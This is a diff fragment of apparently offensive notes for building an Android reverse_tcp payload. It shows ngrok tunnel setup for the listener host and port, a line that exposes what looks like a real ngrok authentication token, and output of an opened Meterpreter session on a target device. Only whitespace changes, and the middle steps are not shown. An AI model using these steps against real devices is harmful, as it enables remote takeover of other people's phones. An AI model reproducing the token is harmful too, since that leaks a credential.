@@ -5,7 +5,7 @@ Step 1: Type of payload in Android Platform
 Step 2: Determine the LHost and LPort 
       
        * sudo ngrok tcp 1234  ;need to register into  ngrok.com
-                               type the following shell to get forwarding ip and 			       port
+                               type the following shell to get forwarding ip and port
                              * choco install ngrok
                              * ngrok config add-authtoken 2hJD4la2KlIP9w0KPeZ3elIMXos_4s3QNR2S6z4gJcBH9eAPs  (authentication token for default ngrok.yml configuration file)
 
@@ -36,7 +36,7 @@ Step 11: Once the app is running, we get reverse_tcp response
 [*] Meterpreter session 1 opened (192.168.1.25:4444 (Source ip and port) -> 192.168.1.13:1138) at 2017-12-20
 10:03:43 -0500
 
-Step 12: help (command to see the possible actions/tool be used over the target     	       device.)
+Step 12: help (command to see the possible actions/tool be used over the target device.)
 
 
                            
